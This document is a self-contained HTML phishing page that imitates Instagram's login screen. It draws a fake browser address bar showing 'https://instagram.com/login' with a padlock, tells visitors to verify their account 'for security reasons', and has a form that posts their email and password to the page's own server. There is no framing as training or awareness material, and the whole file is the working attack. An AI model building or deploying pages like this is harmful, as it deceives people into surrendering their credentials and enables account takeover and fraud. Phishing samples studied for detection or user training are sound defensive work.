<!DOCTYPE html>
<html>
<head>
    <title>Instagram - Account Verification</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .fake-url {
            position: fixed;
            top: 0;
            width: 100%;
            background: #f0f0f0;
            padding: 8px;
            font-size: 13px;
            color: #555;
            text-align: center;
            border-bottom: 1px solid #ddd;
        }

        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }

        h2 {
            font-family: cursive;
            font-size: 40px;
            margin-bottom: 30px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
        }

        input:focus {
            outline: none;
            border: 1px solid #a8a8a8;
            background: white;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background-color: #007adf;
        }

        .warning-text {
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 15px;
        }
    </style>
</head>

<body>

<div class="fake-url">
    🔒 https://instagram.com/login
</div>

<div class="login-box">
    <h2>Instagram</h2>
    <p class="warning-text">
        For security reasons, please verify your account.
    </p>

    <form action="/login" method="POST">
        <input type="email" name="email" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Account</button>
    </form>
</div>

</body>
</html>
